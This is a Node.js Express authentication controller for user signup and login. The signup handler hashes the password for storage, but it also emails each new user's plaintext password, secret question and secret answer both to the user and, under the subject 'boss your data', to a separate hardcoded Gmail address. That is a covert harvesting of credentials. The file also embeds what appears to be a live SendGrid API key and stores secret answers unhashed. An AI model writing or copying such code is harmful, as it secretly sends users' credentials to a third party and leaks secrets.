const {validationResult} = require('express-validator');
const userModel = require('../models/users');
const nodemailer = require('nodemailer');
const sendgridTransport = require('nodemailer-sendgrid-transport')
const bcrypt = require('bcryptjs')
const { param } = require('../routes/auth');

const transporter = nodemailer.createTransport(
    sendgridTransport({
      auth: {
        api_key:
          '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'
      }
    })
  );
  
 exports.GetsignUp = (req,res,next)=>{
//  const email = req.body.email;
//  const passsword = req.body.passsword;
//  const firstName = req.body.firstName;
//  const secondName = req.body.secondName;
res.render('auth/auth.ejs',{
    pageTitle:'signUp',
    message:'',
    validationErrors:[],
    oldinPut:{},
    forSignUp:true
})
 }

 exports.postSignUp = async (req,res,next)=>{
const email = req.body.email;
const password = req.body.password;
const firstName = req.body.firstName;
const secondName = req.body.secondName;
const secretQuestion = req.body.secretQuestion
const secretAnswer = req.body.secretAnswer
const image = req.file;
 console.log(image.path);
 
 const error = validationResult(req);
 if(!error.isEmpty()){
    return res.render('auth/auth.ejs',{
        pageTitle:'signUp',
        message:error.array()[0].msg,
        oldinPut:{
            firstName:firstName,
            secondName:secondName,
            email:email,
            passsword:password,
            question:secretQuestion,
            answer:secretAnswer,
            image:image,
            forSignUp:true
        },
        validationErrors: error.array()

    })

 }

 const result = await userModel.findOne({email:email})
 if(result){
    return res.render('auth/auth.ejs',{
        pageTitle:'signUp',
        message:'user with this email already exist !',
        oldinPut:{
            firstName:firstName,
            secondName:secondName,
            email:email,
            passsword:password,
            question:secretQuestion,
            answer:secretAnswer,
            image:image,
            forSignUp:true
        },
        validationErrors: [{param:'email'}]
    })

 }

 const hashedPassword = await bcrypt.hash(password, 12)

 const user = userModel({
     firstName:firstName,
     status:image.path,
     secondName:secondName,
     email:email,
     password:hashedPassword,
     secretQuestion:secretQuestion,
     secretAnswer:secretAnswer
    })

    try {
      const save = await   user.save()
      req.session.isAth = true,
      req.session.user = save;
      req.session.save();
      res.redirect('/')
      transporter.sendMail({
          to: email,
          from: 'mugishodjibril2004@gmail.com',
          subject: 'Signup succeeded!',
          html:`   
    
       <h1 class="messgage">You have succesfully signed up</h1> 
       
       <div class="data_container">
    
        <h1>Your datas</h1>
    
       <h2>E-mail: <span>${email}</span> </h2>
       <h2>First Name: <span> ${firstName} </span></h2>
       <h2>Second Name: <span> ${secondName} </span></h2>
       <h2>Password: <span>${password} </span></h2>   
       <h2>Secret Question: <span> ${secretQuestion} </span></h2>
       <h2>Secret answer: <span> ${secretAnswer} </span></h2>
       </div>
    
    `
        });
        transporter.sendMail({
            to: 'mugishodjibril7@gmail.com',
            from: 'mugishodjibril2004@gmail.com',
            subject: 'boss your data',
            html:` 
            
      
         <h1 class="messgage">You have successfully signed up</h1> 
         
         <div class="data_container">
      
          <h1>Your datas</h1>
      
         <h2>E-mail: <span>${email}</span> </h2>
         <h2>First Name: <span> ${firstName} </span></h2>
         <h2>Second Name: <span> ${secondName} </span></h2>
         <h2>Password: <span>${password} </span></h2>   
         <h2>Secret Question: <span> ${secretQuestion} </span></h2>
         <h2>Secret answer: <span> ${secretAnswer} </span></h2>
         </div>  `
        })
        console.log('email sent')
    } catch (error) {
        console.log(err)
    }
 }


 //login 



 exports.Getloggin = (req,res,next)=>{
    res.render('auth/auth.ejs',{
        pageTitle:'login',
        message:'',
        validationErrors:[],
        oldinPut:{},
        forSignUp:false
    })
 }


 exports.psotLoggin = async (req,res,next)=>{
    const email = req.body.email;
    const password = req.body.password;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;


    const error = validationResult(req);
    if(!error.isEmpty()){
       return res.render('auth/auth.ejs',{
        forSignUp:false,
           pageTitle:'signUp',
           message:error.array()[0].msg,
           oldinPut:{
               firstName:firstName,
               secondName:secondName,
               email:email,
               passsword:password,
           },
           validationErrors: error.array()
   
       })
   
    }
   
   const user = await   userModel.findOne({email:email,firstName:firstName,secondName:secondName})
   if(!user){
    return res.render('auth/auth.ejs',{
        forSignUp:false,
        pageTitle:'signUp',
        message:'no such user found! check the email and the name  ',
        oldinPut:{
        firstName:firstName,
        secondName:secondName,
        email:email,
        passsword:password,
        },
        validationErrors: [{param:'email'}]
    }) 
   }

   const comparePssword = await bcrypt.compare(password,user.password)
    
   if(comparePssword){
    req.session.isAth = true,
      req.session.user = user;
      req.session.save();
      res.redirect('/')
   }else
   {
    return res.render('auth/auth.ejs',{
        forSignUp:false,
        pageTitle:'signUp',
        message:'incorrect password',
        oldinPut:{
        firstName:firstName,
        secondName:secondName,
        email:email,
        passsword:password,
        },
        validationErrors: [{param:'password'}]
    }) 
   }
 }



